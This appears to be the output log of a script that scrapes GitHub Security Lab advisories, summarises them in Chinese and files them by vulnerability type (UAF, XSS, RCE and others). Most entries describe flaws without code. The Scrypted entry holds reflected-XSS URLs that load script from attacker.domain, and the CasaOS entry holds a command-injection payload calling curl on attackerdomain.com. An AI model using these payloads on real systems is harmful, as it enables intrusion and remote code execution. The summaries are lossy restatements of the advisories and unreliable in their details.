+- 简而言之，`context` 被 `throw_error` 释放后，`accounts_user_complete_set_language` 将访问已释放的内存，造成 UAF。
+
+## 攻击方式
+攻击者可以通过使 `user_HOME_available` 失败来触发该漏洞。例如，攻击者可以删除其主目录中的所有文件。还有其他方法可以触发 `throw_error`，比如使用包含无效字符的字符串。
+
+### 影响
+- 在 Ubuntu 23.04 上，执行上述命令会导致 `accounts-daemon` 崩溃，出现 SIGSEGV 错误。
+- 在 Ubuntu 22.04 LTS 上则没有明显的危害，差异原因在于 GLib 内存分配的变化：新版本使用了系统分配器，使得释放内存的方式导致 UAF 明显引发崩溃。
+
+## 安全影响
+虽然利用此漏洞可能比较困难，但它可能使低权限的本地攻击者获取 root 权限。
+
+## 报告信息
+该问题由 GHSL 团队成员 @kevinbackhouse 发现并报告。如需与 GHSL 团队联系，请发送邮件至 securitylab@github.com，邮件中请提到 GHSL-2023-139。
+Folder 'UAF' created.
+UAF
+内容已保存至 UAF/GHSL_2023_139_使用后释放漏洞_CVE_2023_3297_在_accountss_c74a2583.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-139_accountsservice/
+# GHSL-2022-054: Arm Mali GPU驱动中的使用后释放（Use-after-free，UAF）漏洞 - CVE-2022-38181
+
+## 简介
+
+这是一个影响Pixel 6和Pixel 6 Pro的漏洞，位于Arm Mali GPU驱动中。
+
+## 技术背景
+
+- **受影响设备**: Pixel 6
+- **漏洞描述**: 在内存紧张时，内核会尝试释放一些内存，以便能够分配更多页面。这一过程涉及到一个叫做`kbase_mem_evictable_reclaim_scan_objects`的方法。
+
+### 漏洞发生过程
+
+1. **内存压力**: 当可用内存不足时，内核会调用已注册的回收器来尝试释放内存。
+2. **内存回收**: `kbase_mem_evictable_reclaim_scan_objects`方法会释放与某个内存区域相关的后备页面。
+3. **释放后区域**: 紧接着会调用`kbase_jit_backing_lost`来处理释放的内存区域。
+4. **引用保持**: 一个新的内存区域（`kbase_va_region`）可以通过`kbase_jit_allocate`进行分配，并在`kbase_context::jit_alloc`中保持引用。 
+5. **引发漏洞**: 当原本已经释放的内存区域仍然持有引用时，后续使用这个区域会造成“使用后释放”的问题。
+
+## 联系与报告
+
+- 该漏洞是由GHSL团队成员@m-y-mo（Man Yue Mo）发现并报告的。
+- 有关此问题的联络，请发送邮件至：securitylab@github.com，并在通信中提及GHSL-2022-054。
+
+## Android安全团队的回复
+
+1. **设备特定问题**: Android安全团队认为这是一个设备特定的问题，而不是Android平台的安全漏洞。
+2. **与ARM合作**: 因为影响范围受ARM控制，Android团队已将报告分享给ARM进行调查和修复。
+3. **客户支持**: Android团队建议用户联系设备支持以获得进一步帮助。
+
+整体而言，该漏洞主要涉及GPU驱动程序的内存管理，在执行内存回收时存在潜在安全隐患。
+Folder 'UAF（使用后释放）' created.
+UAF（使用后释放）
+内容已保存至 UAF（使用后释放）/GHSL_2022_054_Arm_Mali_GPU驱动中的使用后释放_Use_after_fre_ba761254.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-054_Arm_Mali/
+# GHSL-2022-028: Codex-Team中的复制/粘贴跨站脚本攻击（XSS）
+
+## 简介
+
+在`codex-team/editor.js`中，当用户将特制内容复制并粘贴到编辑器时，存在跨站脚本攻击（XSS）的漏洞。
+
+### 技术细节
+
+- **受影响的版本**: Editor.js 2.24.2
+- **问题描述**: `processHTML`方法将粘贴的内容直接传递给`wrapper`的`innerHTML`属性。这意味着恶意代码可以被注入和执行。
+- **影响范围**: 使用editor.js的项目（如webiny/webiny-js、frappe/frappe和Jungwoo-An/react-editor-js）都可能受到此漏洞的影响。
+
+### 发现者
+
+此问题由CodeQL团队成员@kaeluka（Stephan Brandauer）和@erik-krogh（Erik Krogh Kristensen）发现，使用了社区成员@bananabr（Daniel Santos）贡献的CodeQL查询。
+
+### 联系方式
+
+如需进一步信息，请联系GHSL团队：securitylab@github.com，并在相关通信中提及GHSL-2022-028。
+
+### 建议
+
+建议为此问题创建一个私有的GitHub安全咨询，这样可以邀请GHSL团队进行协作，并在公开之前私下讨论这些发现。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2022_028_Codex_Team中的复制_粘贴跨站脚本攻击_XSS_4b6342b3.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-028_codex-team_editor_js/
+# GHSL-2023-218 和 GHSL-2023-219: Scrypted中的跨站脚本攻击 (XSS)
+
+在Scrypted软件中发现了两个反射型跨站脚本攻击（XSS）漏洞。这些漏洞可能允许攻击者通过特制的链接冒充任何用户，甚至可能冒充管理员并执行任意命令。
+
+## 技术基础知识
+
+### 什么是跨站脚本攻击 (XSS)？
+
+跨站脚本攻击（XSS）是一种安全漏洞，攻击者可以通过在网页中注入恶意JavaScript代码，使得不知情的用户执行该代码。通常，这种攻击依赖于用户点击一个带有恶意脚本的链接。
+
+### 漏洞描述
+
+1. **反射型 XSS 漏洞**
+   - 在Scrypted v0.55.0版本中，参数`owner`和`pkg`在响应中被直接返回，这导致了反射型XSS漏洞的产生。
+   - 攻击者可以利用此漏洞进行远程代码执行（RCE）。
+
+### 证明概念（Proof of Concept）
+
+- **漏洞利用示例**
+  
+  以下链接将创建一个`<script>`标签，当用户访问该链接后，恶意脚本`attacker.domain/rce.js`将被加载：
+  ```
+  https://localhost:10443/endpoint/<img src onerror=a=document.createElement('script');a.setAttribute('src',document.location.hash.substr(1));document.head.appendChild(a>/pkg#//attacker.domain/rce.js
+  ```
+  - 用户的浏览器将执行该JavaScript代码，可能泄露服务器信息并执行shell命令。
+
+2. **登录页面的反射型 XSS**
+   - 在登录页面中，通过`redirect_uri`参数，攻击者可以指定一个`javascript:` URL。
+  
+  以下示例也展示了如何利用此漏洞：
+  ```
+  https://localhost:10443/endpoint/test/test?redirect_uri=javascript:var%20script%20=%20document.createElement('script');script.src%20=%20'https://attacker.domain';%20document.head.appendChild(script);#//
+  ```
+  - 这将加载一个恶意JavaScript文件，可能导致RCE。
+
+### 漏洞发现
+
+这些问题是由GHSL团队成员@Kwstubbs（Kevin Stubbings）发现并报告的。利用CodeQL的反射型XSS查询找到了这些漏洞。
+
+如需联系GHSL团队，请发送邮件至securitylab@github.com，并在任何通讯中提及GHSL-2023-218或GHSL-2023-219以供参考。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_218_和_GHSL_2023_219_Scrypted中的跨站脚本攻击_X_a8d844fa.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-218_GHSL-2023-219_scrypted/
+# GHSL-2023-081_GHSL-2023-082: Tar Slip Vulnerabilities in Autolab
+
+发现了两个 Tar Slip 漏洞，这些漏洞可能允许攻击者在系统文件中创建或替换文件，甚至执行它们。
+
+## 漏洞概述
+**影响版本**: Autolab v2.10.0
+
+### 漏洞类型
+1. **Install 评估功能的漏洞 (CVE-2023-32676)**
+   - 攻击者需要具备讲师权限，并上传一个特制的 Tar 文件。
+   - 攻击者可以利用该功能上传包含指向目标目录之外路径的文件（例如：`../../../../tmp/tarslipped1.sh`）。
+   - 文件在提交后被解压缩到攻击者指定的位置。
+
+   **关键代码**:
+   ```python
+   # 关键变量
+   relative_pathname = full_name_from_archive
+   ```
+
+2. **MOSS 抄袭检测功能的漏洞 (CVE-2023-32317)**
+   - 攻击者同样需要具备讲师权限，并可上传特制的 Tar 文件。
+   - 攻击者可以上传包含超出目标路径的文件（例如：`../../../../tmp/tarslipped2.sh`）。
+   - 文件在检测启动时被解压缩到攻击者指定的位置。
+
+   **关键代码**:
+   ```python
+   # 关键变量
+   destination = pathname_from_archive
+   ```
+
+## 漏洞后果
+- 这些问题可能导致任意文件写入。
+- 在某些情况下，可能导致远程代码执行（如果写入的文件可被执行）。
+
+## 漏洞重现
+- 攻击者可以创建含有漏洞的 Tar 文件，且文件路径指向系统的临时目录。
+- 成功利用后，将在 `/tmp` 文件夹中看到 `tarslipped1.sh` 或 `tarslipped2.sh` 文件。
+
+## 联系信息
+这些问题由 GHSL 团队成员 @p-（Peter Stöckli）发现。如果您需要更多信息，您可以通过 securitylab@github.com 联系 GHSL 团队，请在通信中提及 GHSL-2023-081 或 GHSL-2023-082。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_081_GHSL_2023_082_Tar_Slip_Vulnerabilit_95819084.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-081_GHSL-2023-082_Autolab/
+# GHSL-2021-1044: iziModal中的跨站脚本攻击 (XSS) - CVE-2021-32860
+
+## 什么是iziModal？
+
+iziModal是一个用于创建模态窗口的JavaScript库。
+
+## 漏洞概述
+
+### 漏洞类型：
+- **跨站脚本攻击（XSS）**：攻击者利用该漏洞能够在用户的浏览器中执行恶意代码。
+
+### 漏洞影响：
+
+- 该漏洞在`iziModal`的标题处理时出现。
+- 攻击者如果能控制模态窗口的标题，就可以输入任意的HTML或JavaScript代码。
+- 一旦被渲染，该代码将在用户的上下文中执行，从而可能导致XSS攻击。
+
+### 受影响的版本：
+- iziModal 版本 **1.5.1**
+
+## 示例代码
+
+下面是一个可能的漏洞利用代码段：
+
+```javascript
+// 漏洞示例代码（假设）：
+// 假设攻防者影响了title字段
+iziModal.setTitle("<script>alert('XSS!');</script>");
+```
+
+## 发现此漏洞的人：
+
+- 此漏洞由GitHub团队成员 **@erik-krogh** 发现。
+
+## 联系方式
+
+如果您有关于此问题的疑问，可以联系GHSL团队，邮箱是:
+
+- **securitylab@github.com**
+- 请在通信中提及 **GHSL-2021-1044**。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2021_1044_iziModal中的跨站脚本攻击_XSS_CVE_2021_2fd4fd5a.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-1044_iziModal/
+# GHSL-2021-104: Countly Server中的跨站脚本漏洞 - CVE-2021-32852
+
+## 描述
+
+在 [Countly Server](https://github.com/Countly/countly-server) 中发现了一个跨站脚本（XSS）漏洞。
+
+## 漏洞详情
+
+- 漏洞位置：`reset.html` 文件中的模板片段。
+- 影响：攻击者可以通过设置`message`和`password_min`参数进行代码注入。
+  
+### 代码注入示例
+
+```html
+<%= message %>
+```
+
+- 该标签通常会对HTML进行转义，所以不允许跳出字符串。
+- 但是，反斜杠没有被转义，攻击者可以利用这一点进行注入。
+
+### 攻击方式
+
+1. 受害者需要点击恶意链接或从恶意网站重定向。
+2. 攻击者必须拥有一个账户或能够创建一个账户。
+
+## 版本影响
+
+- 目前尚不清楚该开源代码是否与企业版软件相关，可能只有社区版本受影响。
+
+## 报告人
+
+该问题由 GitHub CodeQL 团队的 @asgerf（Asger F）发现。
+
+## 联系方式
+
+如果有关于此问题的任何疑问，请通过 securitylab@github.com 联系 GHSL 团队，并在沟通中注明 GHSL-2021-104。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2021_104_Countly_Server中的跨站脚本漏洞_CVE_2021_3_35f4a8d4.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-104-countly-server/
+# GHSL-2021-1012: 随机数生成不良的密钥对问题 - CVE-2021-41117
+
+## 背景
+
+`keypair` 库实现了多种加密原语，部分依赖其他库（如 node-forge）。研究发现，这个库在生成SSH用的RSA密钥时，产生了相同的密钥。这意味着产生的 P 和 Q 值（以及 N 值）是相同的，这在实际应用中是不可接受的，特别是对于RSA-2048密钥。
+
+问题的根源在于随机数生成不良，表明其对CSPRNG（加密安全伪随机数生成器）输出处理不当。
+
+## 技术问题
+
+### 版本
+- `keypair` 版本：v1.0.3
+
+### 随机数生成方法
+
+- 库没有完全依赖平台提供的CSPRNG，而是使用了基于计数器的CMAC方法。
+- 在浏览器环境下，它使用 `window.crypto.getRandomValues()` 来生成“真正”的随机数据。
+- 在Node.js环境下，库无法找到`window`对象，因此使用了不那么安全的替代方案，且这个方案本身也存在bug。
+
+### 具体问题
+
+1. **CSPRNG调用错误**: 
+   - 原本应该调用Node的CSPRNG，但由于变量命名冲突，导致这个调用分支从未被执行。
+
+2. **随机数生成算法**:
+   - 当`window.crypto.getRandomValues()`不可用时，库使用Lehmer LCG（线性同余生成器）生成随机数，且种子来自于 `Math.random()`，这本身就是一个安全隐患。
+   
+3. **输出掩码错误**:
+   - 生成的输出经过了错误的编码，具体问题在于下面的代码行：
+     ```javascript
+     String.fromCharCode(String.fromCharCode(next & 0xFF))
+     ```
+   - 上述代码的双重 `String.fromCharCode` 是无意的，导致大部分输出为零。结果是97%的种子输出是0，只有0到9之间的数字是有效值。
+
+## 影响
+
+1. **安全风险**: 
+   - 由于随机数生成不良，`keypair` 生成的RSA密钥容易被猜测，攻击者可能会解密机密信息或获授权访问受害者的账户。
+
+2. **责任和发现**:
+   - 该问题由Axosoft的Ross Wheeler报告，工程师Dan Suceava首次发现影响，GitHub安全工程师Kevin Jones独立调查并确认了bug的根源。
+
+如果您需要进一步的帮助或想要讨论此问题，请联系GHSL团队，电子邮件：securitylab@github.com，并在沟通中提及GHSL-2021-1012。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2021_1012_随机数生成不良的密钥对问题_CVE_2021_41117_663f1a6b.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-1012-keypair/
+# GHSL-2022-048: Jsonxx中的双重释放漏洞 - CVE-2022-23459
+
+## 什么是双重释放（Double Free）？
+
+双重释放是一种内存管理错误，当一块内存被释放两次或尝试在释放后使用时，就会发生这种情况。这可能导致程序意外的行为，包括安全漏洞。
+
+## 受影响的库
+
+- **库名称**: Jsonxx
+- **版本**: v1.0.1
+
+## 漏洞描述
+
+Jsonxx库的`Value`类使用了默认的赋值操作符，而该类中包含指针成员。在某些使用场景中，这种设计可能导致双重释放或在内存被释放后继续使用该内存（使用后释放，Use After Free）的问题。
+
+## 漏洞影响
+
+- 攻击者可能利用此漏洞执行任意代码。
+
+## 报告与联系
+
+该漏洞由GHSL团队成员@JarLob（Jaroslav Lobačevski）发现并报告。如果需要进一步联系GHSL团队，请发送电子邮件到 **securitylab@github.com**，邮件中请提及参考编号 **GHSL-2022-048**。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2022_048_Jsonxx中的双重释放漏洞_CVE_2022_23459_98eddc8e.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-048_Jsonxx/
+# GHSL-2022-138: Lorawan Stack 的开放重定向漏洞 - CVE-2023-26494
+
+## 概述
+在 lorawan stack 服务器的登录页面存在一个开放重定向漏洞。这允许攻击者在用户登录时提供一个可以被用户控制的重定向地址。
+
+## 受影响版本
+- lorawan-stack 版本：**v3.23.1**
+
+## 漏洞详情
+在用户成功登录后，系统会将用户重定向到 `n` 参数指定的地址。这一处理是在 `/oauth/login` 和 `/oauth/token-login` 接口中发生的：
+
+- 登录成功后，`n` 的值被赋给 `window.location`，导致用户被重定向。
+
+## 风险
+此漏洞可能导致恶意攻击者进行网络钓鱼（phishing）攻击。用户可能会误认为自己已经安全地返回主页，实际上却被重定向到攻击者指定的网站。
+
+## 更多信息
+- [开放重定向漏洞学习资源](https://learn.snyk.io/lessons/open-redirect/javascript/)
+- 此漏洞由 GHSL 团队成员 @Kwstubbs（Kevin Stubbings）发现并报告。
+
+## 联系方式
+对该漏洞有任何疑问，可以联系 GHSL 团队，电子邮件：securitylab@github.com，邮件中请提及引用 GHSL-2022-138。
+Folder '开放重定向漏洞' created.
+开放重定向漏洞
+内容已保存至 开放重定向漏洞/GHSL_2022_138_Lorawan_Stack_的开放重定向漏洞_CVE_2023_2_0da4b290.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-138_lorawan-stack/
+# GHSL-2022-119: CasaOS中的任意命令执行漏洞 - CVE-2023-37469
+
+## 概述
+在CasaOS中，如果经过身份验证的用户成功连接到一个控制的SMB服务器，他们可以执行任意命令。
+
+### 受影响版本
+- CasaOS版本: v3.7-1
+
+## 技术细节
+
+- **漏洞来源**: 
+  - `MountSmaba` 函数通过 `PostSambaConnectionsCreate` 调用，并且未对输入进行清理。
+  
+- **漏洞影响**: 
+  - 在验证SMB共享时，如果攻击者提供恶意参数且这些参数在SMB服务器上有效，则可能发生命令注入。
+
+### 漏洞示例
+- 攻击者可以利用`password`参数进行命令注入。例如：
+  ```bash
+  ;CMD=$'\x20attackerdomain.com';curl$CMD
+  ```
+
+## 发现与报告
+- 该漏洞由GHSL团队成员@Kwstubbs (Kevin Stubbings)发现，并使用CodeQL查询（go/command-injection）进行识别。
+
+## 联系方式
+如需联系GHSL团队，请发送邮件至 securitylab@github.com，并在通信中引用GHSL-2022-119以便于识别。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2022_119_CasaOS中的任意命令执行漏洞_CVE_2023_37469_9b7dda81.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-119_CasaOS/
+# GHSL-2021-020: HBS 文件泄露漏洞 - CVE-2021-32822
+
+## 概述
+
+Express JS 的渲染 API 本来只应传递模板数据。但是，如果允许传递模板引擎的配置选项，可能会导致安全问题，包括跨站脚本（XSS）和远程代码执行（RCE）。
+
+## 背景知识
+
+- **Express JS**：一个流行的 web 框架，允许使用不同的模板引擎。
+- **模板引擎**：用于处理动态内容的工具，它们通过检查传入的对象来替换模板中的内容。
+
+### 示例
+
+例如，可以使用以下代码渲染名为“index”的模板，并传递一个包含标题和消息的对象：
+
+```javascript
+res.render('index', { title: 'Hello', message: 'World' });
+```
+
+## 问题描述
+
+许多模板引擎希望直接通过 Express 的渲染 API 接收其配置参数（例如模板目录路径和模板名称）。这可能会导致安全漏洞，尤其是当传递的对象是用户可控时（例如，`req.query`）。这样，恶意用户可能会通过提供不安全的配置选项来操纵应用程序。
+
+### 安全影响
+
+- 影响范围：取决于应用程序使用的模板引擎，可能包括 XSS 和 RCE。
+- **重要**：这种混合使用（模板数据和配置选项）并不是 Express 的设计初衷。
+
+## 具体案例
+
+以 hbs（v4.1.1）为例，它不当混合了模板数据和配置选项，可能导致文件泄露漏洞。通过覆盖内部配置选项，不当的应用程序代码可能导致泄露敏感信息。
+
+### 漏洞示例
+
+以下代码示例展示了如何从易受攻击的应用程序中检索 `app.js` 的内容：
+
+```javascript
+// 示例代码，可能导致文件泄露
+```
+
+## 结论
+
+我们的研究发现，很多模板引擎不经意间使用了这种不安全的 Express 渲染 API 模式，导致许多下游应用程序可能受影响。我们向开发者发出警告，以防止未来类似的 API 误用。
+
+### 联系我们
+
+如果有任何问题或需要进一步的信息，请联系 GHSL 团队：securitylab@github.com，并在通信中提及 GHSL-2021-020。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2021_020_HBS_文件泄露漏洞_CVE_2021_32822_3e9bd9de.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/
+# GHSL-2022-061: Bearer Token 泄露问题 - CVE-2022-39304
+
+## 概述
+- **发布日期**: 2022年12月19日
+- **问题描述**: 在进行令牌更新时，如果发生错误，应用的完整 Bearer 令牌可能会被泄露。这可能会出现在 Slack 频道或类似应用中。
+
+## 技术细节
+- **受影响版本**: ghinstallation 版本最高至 2.1.0
+- **泄露过程**: 当令牌更新出现错误时，系统会输出应用的完整 Bearer 令牌。这有可能导致令牌被外部获取，进而导致应用被劫持。
+
+## 报告信息
+- 此问题由 GitHub 的团队成员 @Miskerest（Mike Bailey）发现并报告。
+- 如需联系 GHSL 团队，请发送邮件至 securitylab@github.com，并在沟通中提及 GHSL-2022-061。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2022_061_Bearer_Token_泄露问题_CVE_2022_39304_1754b3cc.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-061_ghinstallation/
+# GHSL-2020-258: ZipSlip 漏洞在 bblfshd 中 (CVE-2021-32825)
+
+## 概述
+bblfshd 中存在一个漏洞，允许攻击者通过不安全地处理符号链接，读取或写入指定目标文件夹之外的位置。
+
+## 漏洞细节
+- **问题描述**: 在解压缩 tar 文件时，程序尝试防止创建指向解压目录外的符号链接。然而，攻击者可以利用精心构造的 tar 文件创建这些符号链接，导致指向不安全的位置。
+  
+- **示例**: 攻击者可以在 tar 文件中链接一个子目录到其父目录，从而使得符号链接最终指向 tar 文件的父目录，绕过程序的安全检查。
+
+## 风险
+1. **任意文件写入**: 如果攻击者能够控制 tar 文件，他们可以在系统中任意位置写入文件，权限与运行解压程序的用户相同。
+2. **任意文件读取**: 如果攻击者可以读取已解压的文件，他们也能够读取系统上该进程有权限访问的任意文件。
+
+## 报告者
+此问题由 GitHub 的团队成员 @smowton（Chris Smowton）发现并报告。
+
+## 联系方式
+如需进一步信息，请联系 GHSL 团队，邮箱为 securitylab@github.com，请在通信中提及 GHSL-2020-258。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2020_258_ZipSlip_漏洞在_bblfshd_中_CVE_2021_328_bb0ad3ae.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-258-zipslip-bblfshd/
+# SANE Backends Vulnerabilities Overview
+
+SANE Backends has multiple vulnerabilities that can be exploited by a malicious device on the same network. Here’s a simplified breakdown of these issues:
+
+## What is SANE Backends?
+SANE (Scanner Access Now Easy) Backends is software that allows scanning devices to communicate with computer applications. 
+
+## Types of Vulnerabilities
+1. **Memory Corruption:** These are flaws that occur when an application incorrectly manages memory, potentially leading to crashes or unintended behavior.
+
+2. **Denial of Service (DoS):** An attack that makes an application unusable. For example, the application `simple-scan` crashes as soon as it starts if it detects a malicious scanner.
+
+3. **Remote Code Execution (RCE):** This allows an attacker to run arbitrary code on the victim's machine, under certain conditions.
+
+## Key Vulnerabilities
+### 1. **Immediate Crashes (DoS)**
+- **Where:** Function `sanei_epson_net_read`
+- **Issue:** The code does not properly check the size of incoming data. This can lead to the application crashing.
+- **Impact:** As soon as `simple-scan` starts, it may crash and stop functioning.
+
+### 2. **Heap Buffer Overflow (RCE)**
+- **Where:** Function `epsonds_net_read`
+- **Issue:** An attacker can control the size of data and write it beyond allocated memory.
+- **Impact:** This allows executing hostile code on the device.
+
+### 3. **Out-of-Bounds Read (Information Leak)**
+- **Where:** Function `decode_binary` and `esci2_check_header`
+- **Issue:** The code reads data beyond the buffer limits, potentially exposing sensitive information.
+- **Impact:** Very low risk in practice, but could help an attacker exploit other vulnerabilities.
+
+### 4. **One-Click Vulnerability**
+- **Where:** Function `esci2_img`
+- **Issue:** Requires user interaction (clicking "Scan"), leading to a buffer overflow.
+- **Impact:** Can potentially lead to remote code execution.
+
+## Affected Versions
+- **Software:** SANE Backends
+- **Version Tested:** libsane1 1.0.27 on Ubuntu 18.04.4 LTS
+
+## Summary
+These vulnerabilities, particularly the Denial of Service and Remote Code Execution, highlight significant risks when using SANE Backends with connected devices. Protection measures should be taken in network environments to prevent exploitation.
+
+For any security concerns, you can contact the GHSL team at securitylab@github.com.
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/SANE_Backends_Vulnerabilities_Overview_9fb2c829.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-075-libsane/
+# GHSL-2021-103: Erxes中的跨站脚本攻击（XSS）问题 - CVE-2021-32853
+
+### 什么是跨站脚本攻击（XSS）？
+跨站脚本攻击（XSS）是一种网络安全漏洞，攻击者可以在网页中插入恶意代码，当用户访问该网页时，恶意代码会在用户的浏览器中执行。
+
+### 问题概述
+- **受影响项目**: [Erxes](https://github.com/erxes/erxes)
+- **最新版本**: 截至目前的最新版本
+
+### 技术细节
+- **漏洞位置**: 在文件 `widgets.ejs` 中的一个模板标签存在代码注入的漏洞。
+- **漏洞原因**: 从请求参数获取的值没有进行适当的转义处理，这使得攻击者可以插入恶意代码，打破字符串文字或脚本标签的封闭。
+
+### 风险
+- **执行的代码**: 恶意代码将在客户端执行。
+- **攻击途径**: 受害者需要点击恶意链接或从恶意网站重定向到受影响的网站。
+
+### 发现者
+- **发现者**: @asgerf（Asger F），来自GitHub的CodeQL团队。
+
+### 联系方式
+- 对于相关问题，可以通过邮箱联系 GHSL 团队：securitylab@github.com，并在沟通中提到 GHSL-2021-103。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2021_103_Erxes中的跨站脚本攻击_XSS_问题_CVE_2021_328_7775e71d.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-103-erxes/
+# GHSL-2021-066: Total.js中的DoS和远程代码执行漏洞
+
+## 简介
+
+- **软件名称**: Total.js
+- **最新版本**: 3.4.8（可从npm获取）
+
+## 漏洞概述
+
+- 在Total.js中，使用`utils.set`函数并传入用户控制的值时，会导致代码注入。
+- 攻击者可以在Node.js的上下文中执行任意的JavaScript代码。
+
+## 漏洞类型
+
+1. **拒绝服务（DoS）**:
+   - 利用漏洞，可以使程序进入无限循环，导致服务不可用。
+
+2. **代码执行（RCE）**:
+   - 利用该漏洞，可以在当前工作目录下创建一个名为“GHSL”的文件，执行任意代码。
+
+## 发现者
+
+- 此漏洞由@erik-krogh（Erik Krogh Kristensen）发现。
+
+## 联系信息
+
+- 如果您有任何疑问或需要报告此问题，请联系GHSL团队：securitylab@github.com，并在邮件中注明GHSL-2021-066。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2021_066_Total_js中的DoS和远程代码执行漏洞_8c9f110a.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-066-totaljs-totaljs/
+# GHSL-2021-1042: Baremetrics中的XSS漏洞 - CVE-2021-32859
+
+## 什么是XSS？
+XSS（跨站脚本攻击）是一种安全漏洞，攻击者可以通过在网页中插入恶意的 HTML 或 JavaScript 代码，使得这些代码在用户的浏览器中执行。
+
+## 漏洞简介
+Baremetrics的日期范围选择器（Date Range Picker）在处理不可信的占位符输入时，存在XSS漏洞。
+
+### 受影响的版本
+- Baremetrics Date Range Picker v1.0.14
+
+## 漏洞原理
+如果攻击者能够影响到创建日历实例时的占位符字段，他们可以插入任意的HTML或JavaScript代码，这些代码会在用户的环境中执行，从而引发XSS攻击。
+
+### 漏洞代码示例
+- 漏洞代码位置：`Calendar.js`
+
+## 发现者
+此问题由GitHub团队成员 @erik-krogh 发现。
+
+## 联系方式
+如需与GHSL团队联系，请发邮件至 securitylab@github.com，并在邮件中提及GHSL-2021-1042。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2021_1042_Baremetrics中的XSS漏洞_CVE_2021_3285_fef8a051.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-1042_Baremetrics_Date_Range_Picker/
+# GHSL-2022-009: CKEditor 4 HTML内容清理绕过漏洞（CVE-2022-24728）
+
+在CKEditor 4中，HTML内容的清理功能存在漏洞，允许执行JavaScript代码。此漏洞类似于CVE-2021-41165，并使用了相同的攻击方式。
+
+## CKEditor 4简介
+
+- **版本**: 4.17.1
+- **功能**: CKEditor 4有一个“源代码”按钮，用户可以在所见即所得（WYSIWYG）编辑和原始HTML编辑模式之间切换。当用户从原始HTML模式切换回所见即所得模式时，CKEditor 4会尝试清理HTML，以阻止插入可执行的JavaScript代码。
+
+## 漏洞细节
+
+尽管CKEditor 4对清理逻辑进行了改进，但仍然可以绕过安全检查。攻击者可以通过以下步骤实现：
+
+1. **使用特殊字符串**: 输入字符串“cke_temp(comment)”，这会触发特定的正则表达式，
+   - 这可以阻止CKEditor 4将`<script>`元素包装在`{cke_protected}`注释中。
+   
+2. **添加特定属性**: 使用`data-cke-filter`属性，触发CKEditor 4的早期返回逻辑。
+
+## 漏洞利用步骤
+
+1. 在浏览器中打开`ckeditor4/samples/index.html`。
+2. 点击“源代码”按钮。
+3. 用以下原始HTML替换现有内容：
+   ```html
+   <script>alert('This is a test');</script>
+   ```
+4. 再次点击“源代码”按钮。
+5. 如果一切正常，你将看到一个警告弹窗。
+
+## 安全影响
+
+此漏洞使攻击者能够绕过CKEditor 4的清理逻辑，从而注入并执行JavaScript代码，可能导致安全风险。
+
+## 报告信息
+
+该漏洞由GHSL团队成员@kevinbackhouse发现。感谢@wbowling（William Bowling）提供关于CVE-2021-41165的额外技术细节。
+
+如需联系GHSL团队，请发送电子邮件至securitylab@github.com，并在相关通信中引用GHSL-2022-009。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2022_009_CKEditor_4_HTML内容清理绕过漏洞_CVE_2022_24_ac92767e.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-009_ckeditor4/
+# GHSL-2021-054_057: Hyperkit中的代码执行漏洞
+
+此文介绍了**hyperkit**中的多个漏洞（CVE-2021-32843到CVE-2021-32846），这些漏洞允许恶意虚拟机（guest）利用指定的驱动程序，使得恶意代码在宿主机（host）上执行，从而导致服务拒绝（Denial of Service, DoS）。
+
+## 技术基础
+
+### Hyperkit
+
+- **Hyperkit**是一个用于虚拟化的工具，主要用于运行虚拟机（如Docker中的虚拟环境）。
+- 设备通过结构体 `virtio_consts` 实现，里面包括了处理程序和组件。
+
+### Virtio 设备
+
+- Virtio是一种支持虚拟化设备的标准。每个设备可以实现一些操作，包括读取和写入配置。
+- 设备可能并不实现所有可用的操作，因此在调用这些操作之前，必须检查指针是否为**null**。
+
+### vtrnd设备
+
+- **vtrnd**是一个能够给虚拟机提供随机数的Virtio设备。
+- 当尝试读取配置时，如未检查指针是否为null，可能导致宿主机崩溃。
+
+## 漏洞概述
+
+### 漏洞示例
+
+1. **vc_cfgread**:
+   - 如果调用未检查null，可能会使宿主机崩溃。
+  
+2. **vc_cfgwrite**:
+   - 类似`vc_cfgread`，在调用未检查情况下，宿主机会崩溃。
+
+3. **vq_getchain**:
+   - 该函数用于读取虚拟机的随机数。如果处理错误未被检查，则会发生内存未初始化的读操作，可能导致宿主机崩溃和内存损坏。
+
+4. **pci_vtsock_proc_tx**:
